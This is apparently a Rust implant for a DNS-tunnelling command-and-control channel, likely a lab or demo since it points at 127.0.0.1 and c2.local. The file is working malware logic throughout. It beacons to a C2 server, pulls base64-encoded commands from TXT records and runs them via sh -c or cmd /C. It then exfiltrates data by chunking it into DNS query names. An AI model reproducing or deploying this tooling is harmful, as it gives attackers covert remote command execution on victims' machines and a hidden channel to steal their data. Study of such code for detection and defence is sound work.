use std::net::UdpSocket;
use std::process::Command;
use std::thread;
use std::time::Duration;

pub const C2_SERVER: &str = "127.0.0.1:55353";
pub const DOMAIN: &str = "c2.local";
pub const BEACON_INTERVAL: u64 = 5; // seconds

// Simple DNS query builder
pub fn build_dns_query(domain: &str, qtype: u16) -> Vec<u8> {
    let mut query = Vec::new();

    // Transaction ID (random)
    query.extend_from_slice(&[0x13, 0x37]);

    // Flags: Standard query, recursion desired
    query.extend_from_slice(&[0x01, 0x00]);

    // Questions: 1, Answers: 0, Authority: 0, Additional: 0
    query.extend_from_slice(&[0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);

    // Encode domain name
    for label in domain.split('.') {
        query.push(label.len() as u8);
        query.extend_from_slice(label.as_bytes());
    }
    query.push(0); // Null terminator

    // QTYPE
    query.extend_from_slice(&qtype.to_be_bytes());

    // QCLASS (IN = 1)
    query.extend_from_slice(&[0x00, 0x01]);

    query
}

pub fn generate_implant_id() -> String {
    let hostname = hostname::get()
        .ok()
        .and_then(|h| h.into_string().ok())
        .unwrap_or_else(|| "unknown".to_string());

    let random = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
        % 10000;

    format!("{}_{}", hostname, random)
}

// Parse A record response
pub fn parse_a_response(response: &[u8]) -> Option<[u8; 4]> {
    if response.len() < 12 {
        return None;
    }

    // Check if we have at least one answer
    let an_count = u16::from_be_bytes([response[6], response[7]]);
    if an_count == 0 {
        return None;
    }

    // Skip to answer section (after header and question)
    // This is simplified - proper parsing would follow pointers
    let answer_start = response.len() - 16; // Approximation

    if answer_start + 16 <= response.len() {
        let ip_start = response.len() - 4;
        if ip_start + 4 <= response.len() {
            return Some([
                response[ip_start],
                response[ip_start + 1],
                response[ip_start + 2],
                response[ip_start + 3],
            ]);
        }
    }

    None
}

// Parse TXT record response
/* Example expected input:
--header--
13, 37, // header ID
81, 80, // Flags 0x8180
00, 01, // qd_count
00, 01, // an_count
00, 00, // ns_count
00, 00, // ar_count
--end header--
--question section--
03,                     // label length = 3
63, 6d, 64,             // Controller request = "cmd"
0d,                     // label length = 13
41, 72, 78, 55, 6d, 62, 72, 61, 5f, 33, 38, 33, 34, // Implant ID ="ArxUmbra_3834"
02,                     // label length = 2
63, 32,                 // "c2"
05,                     // label length = 5
6c, 6f, 63, 61, 6c,     // "local"
00,                     // end of domain name label
00, 10,                 // QTYPE
00, 01,                 // QCLASS
--end question section--
// Answer Section
c0, 0c,                 // Pointer to domain name
00, 10,                 // Type TXT
00, 01,                 // Class IN
00, 00, 00, 3c,         // TTL
00, 09,                 // RDLENGTH
08,                     // TXT string length
64, 32, 68, 76, 59, 57, 31, 70 // Payload = "d2hvYW1p"

* We just need to skip past all of this and grab the payload
*/
pub fn parse_txt_response(response: &[u8]) -> Option<String> {
    // If the response is only the header - skip
    if response.len() < 12 {
        return None;
    }

    let mut next_read_length: usize; // byte count for each section
    let mut current_position = 12; // skip header (12 bytes)

    // Skip over question section
    for _ in 0..4 {
        next_read_length = response[current_position] as usize;
        current_position += next_read_length + 1; // Plus 1 skips the just read label length byte
    }
    assert!(
        response[current_position] == 00,
        "Error skipping and/or processing txt response. end of question section non 0!!! Got: {}",
        response[current_position]
    );

    current_position += 17; // Skip QTYPE, QCLASS and answer section to TXT string length

    let txt_string_len = response[current_position];

    // Read the TXT data into a string to return
    let txt_data = &response[current_position + 1..current_position + 1 + txt_string_len as usize]; // This increments the current pos past the len byte then fills with num bytes given by the len
    if let Ok(txt_data) = String::from_utf8(txt_data.to_vec()) {
        return Some(txt_data);
    }

    None
}

// Base64 decode
pub fn base64_decode(encoded: &str) -> Result<String, &'static str> {
    const CHARS: &str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = Vec::new();
    let cleaned: String = encoded.chars().filter(|c| *c != '=').collect();
    for chunk in cleaned.as_bytes().chunks(4) {
        let b1 = CHARS.find(chunk[0] as char).ok_or("Invalid base64")? as u32;
        let b2 = CHARS
            .find(chunk.get(1).copied().unwrap_or(b'A') as char)
            .ok_or("Invalid base64")? as u32;
        let b3 = chunk
            .get(2)
            .and_then(|&c| CHARS.find(c as char))
            .unwrap_or(0) as u32;
        let b4 = chunk
            .get(3)
            .and_then(|&c| CHARS.find(c as char))
            .unwrap_or(0) as u32;

        result.push(((b1 << 2) | (b2 >> 4)) as u8);
        if chunk.len() > 2 {
            result.push((((b2 & 0x0F) << 4) | (b3 >> 2)) as u8);
        }
        if chunk.len() > 3 {
            result.push((((b3 & 0x03) << 6) | b4) as u8);
        }
    }

    String::from_utf8(result).map_err(|_| "Invalid UTF-8")
}

// Execute shell command
pub fn execute_command(cmd: &str) -> String {
    println!("[*] Executing: {}", cmd);

    #[cfg(target_os = "windows")]
    let output = Command::new("cmd").args(&["/C", cmd]).output();

    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh").args(&["-c", cmd]).output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("STDOUT:\n{}\nSTDERR:\n{}", stdout, stderr)
        }
        Err(e) => format!("Error executing command: {}", e),
    }
}

// Base32 encode (simplified)
pub fn base32_encode(data: &str) -> String {
    // Simplified - just use hex for demo
    data.as_bytes()
        .iter()
        .map(|b| format!("{:02X}", b))
        .collect::<String>()
}

// Chunk data for exfiltration
fn chunk_data(data: &str, chunk_size: usize) -> Vec<String> {
    let encoded = base32_encode(data);
    encoded
        .as_bytes()
        .chunks(chunk_size)
        .map(|chunk| String::from_utf8_lossy(chunk).to_string())
        .collect()
}

pub fn send_dns_query(socket: &UdpSocket, domain: &str, qtype: u16) -> Result<Vec<u8>, String> {
    let query = build_dns_query(domain, qtype);

    socket
        .send_to(&query, C2_SERVER)
        .map_err(|e| format!("Send error: {}", e))?;

    let mut buf = [0u8; 512];
    socket
        .set_read_timeout(Some(Duration::from_secs(2)))
        .map_err(|e| format!("Timeout error: {}", e))?;

    match socket.recv_from(&mut buf) {
        Ok((len, _)) => Ok(buf[..len].to_vec()),
        Err(e) => Err(format!("Recv error: {}", e)),
    }
}

pub fn beacon(socket: &UdpSocket, implant_id: &str) -> Result<bool, String> {
    let query_domain = format!("{}.beacon.{}", implant_id, DOMAIN);
    println!("[*] Beaconing: {}", query_domain);

    let response = send_dns_query(socket, &query_domain, 1)?; // A record

    if let Some(ip) = parse_a_response(&response) {
        println!("[+] Response IP: {}.{}.{}.{}", ip[0], ip[1], ip[2], ip[3]);
        // Check if commands available (1.2.3.5 = yes, 1.2.3.4 = no)
        Ok(ip[3] == 5)
    } else {
        Err("Failed to parse response".to_string())
    }
}

pub fn fetch_command(socket: &UdpSocket, implant_id: &str) -> Result<Option<String>, String> {
    let query_domain = format!("cmd.{}.{}", implant_id, DOMAIN);
    println!("[*] Fetching command: {}", query_domain);

    let response = send_dns_query(socket, &query_domain, 16)?; // TXT record

    if let Some(txt_data) = parse_txt_response(&response) {
        println!("[+] Received TXT: {}", txt_data);

        if txt_data == "NONE" {
            return Ok(None);
        }

        // Decode base64
        match base64_decode(&txt_data) {
            Ok(cmd) => Ok(Some(cmd)),
            Err(e) => Err(format!("Base64 decode error: {}", e)),
        }
    } else {
        Err("Failed to parse TXT record".to_string())
    }
}

pub fn exfiltrate_data(socket: &UdpSocket, data: &str, implant_id: &str) -> Result<(), String> {
    println!("[*] Exfiltrating {} bytes", data.len());

    let chunks = chunk_data(data, 40); // 40 chars per chunk

    for (seq, chunk) in chunks.iter().enumerate() {
        let query_domain = format!("{}.{}.{}.exfil.{}", chunk, seq, implant_id, DOMAIN);
        println!(
            "[*] Sending chunk {}/{}: {}",
            seq + 1,
            chunks.len(),
            query_domain
        );

        match send_dns_query(socket, &query_domain, 1) {
            Ok(_) => println!("[+] Chunk {} ACK'd", seq),
            Err(e) => println!("[!] Chunk {} failed: {}", seq, e),
        }

        thread::sleep(Duration::from_millis(500)); // Rate limiting
    }

    Ok(())
}
